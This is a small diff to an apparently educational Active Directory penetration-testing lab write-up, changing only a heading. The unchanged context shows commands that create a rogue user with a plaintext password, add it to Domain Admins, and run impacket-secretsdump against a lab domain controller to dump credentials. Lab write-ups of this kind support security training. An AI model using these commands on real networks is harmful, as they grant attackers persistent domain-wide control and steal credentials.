@@ -177,7 +177,7 @@ add into Domain Admins group:
     C:\Windows\system32>net user /add hawkeye Password1@ /domain
     C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN
 
-#### 3.Dumping SAM with new account using secretsdump
+#### 3.Dumping SAM with new account using secretsdump **AGAINST THE DOMAIN CONTROLLER**
 Now that we have a new rouge account with admin right created, we can use it to dump secrets - impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138  
 
 ![image](https://github.com/user-attachments/assets/73b12f15-1d2b-4121-a8d4-795cd32ca9b8)  
